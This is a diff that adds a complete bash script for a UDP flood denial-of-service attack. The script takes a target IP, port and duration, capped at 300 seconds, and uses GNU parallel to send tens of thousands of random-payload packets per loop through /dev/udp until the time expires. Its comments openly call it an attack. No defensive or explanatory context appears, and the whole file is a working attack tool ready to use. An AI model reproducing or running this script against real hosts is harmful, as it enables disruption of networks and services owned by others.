@@ -1,0 +1,49 @@
+#!/bin/bash
+
+# Function to send UDP packets
+send_udp_packets() {
+    local target_ip=$1
+    local target_port=$2
+    local duration=$3
+    local start_time=$(date +%s.%N)
+    local end_time=$(echo "$start_time + $duration" | bc)
+
+    # Generate random payload
+    local payload=$(head -c 1024 /dev/urandom | tr -dc 'a-zA-Z0-9')
+
+    # Loop until the attack duration ends
+    while true; do
+        # Send UDP packets with unlimited concurrency
+        seq 1 50000 | parallel -j+0 -N0 'echo "$1" >/dev/udp/'"$target_ip/$target_port" ::: "$payload"
+
+        # Check if the attack duration has ended
+        local current_time=$(date +%s.%N)
+        if (( $(echo "$current_time >= $end_time" | bc -l) )); then
+            break
+        fi
+    done
+}
+
+# Main function
+main() {
+    # Parse command line arguments
+    local target_ip=$1
+    local target_port=$2
+    local duration=$3
+
+    # Ensure that the attack duration does not exceed the maximum limit
+    local max_duration=300
+    duration=$(( duration > max_duration ? max_duration : duration ))
+
+    # Start UDP flood attack
+    send_udp_packets "$target_ip" "$target_port" "$duration"
+}
+
+# Check if required arguments are provided
+if [ $# -ne 3 ]; then
+    echo "Usage: $0 <target_ip> <target_port> <duration>"
+    exit 1
+fi
+
+# Run the main function
+main "$@"
